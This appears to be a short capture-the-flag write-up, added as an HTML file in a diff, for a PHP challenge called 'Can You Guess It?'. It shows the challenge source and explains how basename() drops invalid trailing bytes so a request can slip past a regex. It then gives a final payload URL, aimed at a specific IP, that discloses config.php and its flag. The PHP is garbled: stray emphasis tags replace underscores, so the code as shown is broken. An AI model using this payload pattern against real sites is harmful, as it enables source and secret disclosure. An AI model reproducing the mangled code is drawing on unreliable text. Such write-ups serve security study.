@@ -1,0 +1,36 @@
+<h3>Can You Guess It?</h3>
+
+<p>```php
+<?php
+include 'config.php'; // FLAG is defined in config.php</p>
+
+<p>if (preg<em>match('/config.php\/*$/i', $</em>SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}</p>
+
+<p>if (isset($<em>GET['source'])) {
+  highlight</em>file(basename($<em>SERVER['PHP</em>SELF']));
+  exit();
+}</p>
+
+<p>$secret = bin2hex(random<em>bytes(64));
+if (isset($</em>POST['guess'])) {
+  $guess = (string) $<em>POST['guess'];
+  if (hash</em>equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?>
+```</p>
+
+<ul>
+<li>basename() ignores invalid bytes at the end of path (<code>/config.php/%ff</code> returns <code>config.php</code>)</li>
+<li>Invalid chars at the end of the path bypasses the regex.</li>
+</ul>
+
+<p>Final Payload:
+<code>
+http://18.179.178.246:8003/index.php/config.php/%ff?source
+</code></p>
